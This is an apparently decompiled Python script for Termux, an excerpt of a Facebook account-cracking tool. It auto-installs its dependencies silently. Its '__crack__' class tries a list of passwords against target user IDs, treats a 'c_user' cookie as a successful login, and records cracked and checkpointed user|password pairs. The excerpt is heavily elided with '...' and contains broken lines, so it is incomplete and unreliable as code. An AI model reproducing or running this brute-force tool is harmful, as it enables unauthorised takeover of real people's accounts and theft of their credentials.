# Decompile by : 'KHN BASHIR 
import os,sys
try: import requests
except ModuleNotFoundError:print("KHN Install Module requests");os.system("python -m pip install requests &> /dev/KHN")
try: import bs4
except ModuleNotFoundError:print("KHN Install Module bs4");os.system("python -m pip install bs4 &> /dev/KHN")
try: import mechanize
except ModuleNotFoundError:print("KHN Install Module mechanize");os.system("python -m pip install mechanize &> /dev/KHN")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/KHN")
## import in
...
def main_apv():
    ...
    logo()
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.AXB-cov', 'r').read()
    except IOError:
        os.system("clear")
        logo()
        print ("[*]--------------------------------------------------------------")
        ...
        print ("[*]--------------------------------------------------------------")
        kok=open('/data/data/com.termux/files/usr/bin/.AXB-cov', 'w')
        kok.close()
        print ("")
        print ("")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ AXB] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[AXB-SUCCESSFUL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				...
				try:
					...
					pass
				print('\r\033[1;91m[AXB-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
